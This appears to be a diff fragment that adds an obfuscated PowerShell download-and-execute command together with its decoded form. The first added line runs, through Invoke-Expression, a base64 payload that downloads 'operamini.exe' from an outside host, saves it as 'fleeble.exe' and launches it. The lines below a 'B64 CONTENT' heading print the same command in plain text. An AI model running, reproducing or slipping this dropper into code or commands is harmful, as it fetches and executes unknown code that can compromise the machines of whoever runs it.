@@ -1,0 +1,7 @@
+iex([sySTeM.teXt.eNcodINg]::utf8.gETsTrINg([sYSTEM.CONvert]::FROmBaSe64STring('CihOZXctT2JqZWN0IFN5U3RFbS5OZVQud2VCQ2xpZU5UKS5Eb1dOTG9hRGZpbGUoJ2h0dHA6Ly93b3JsZG5pdC5jb20vb3BlcmFtaW5pLmV4ZScsJ2ZsZWVibGUuZXhlJyk7U3RhcnQtUHJvY2VzcyAnZmxlZWJsZS5leGUnCgo=')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object SyStEm.NeT.weBClieNT).DoWNLoaDfile('http://worldnit.com/operamini.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
